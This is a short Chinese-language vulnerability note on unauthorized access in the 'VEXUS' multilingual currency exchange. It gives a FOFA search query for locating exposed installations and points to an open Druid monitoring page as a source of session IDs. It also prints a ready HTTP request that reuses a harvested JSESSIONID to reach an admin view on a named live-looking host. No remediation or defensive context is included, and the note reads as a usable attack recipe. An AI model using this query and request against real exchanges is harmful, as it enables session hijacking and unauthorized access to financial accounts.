# VEXUS多语言货币交易所存在未授权访问漏洞

# 一、漏洞简介
VEXUS多语言货币交易所存在未授权访问漏洞

# 二、影响版本
+ VEXUS多语言货币交易所

# 三、资产测绘
+ fofa`"image/n2.png" && "public/login.action"`
+ 特征

![1727498799522-822e93ff-50be-42a1-9e0b-111a2f844864.png](./img/cvy4scQ9X281hrqb/1727498799522-822e93ff-50be-42a1-9e0b-111a2f844864-063597.png)

# 四、漏洞复现
```java
/druid/index.html
```

![1727498820102-2db97c04-7594-473e-9e30-dd4678d21aca.png](./img/cvy4scQ9X281hrqb/1727498820102-2db97c04-7594-473e-9e30-dd4678d21aca-036126.png)

获取session后可通过下面poc进行爆破

```java
GET /normal/LoginSuccessAction!view.action?username=admin HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Cookie: JSESSIONID=可用的SESSION
Host: admin.kftust.com
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```



> 更新: 2024-10-22 09:36:08  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nkwou5fss984m2t8>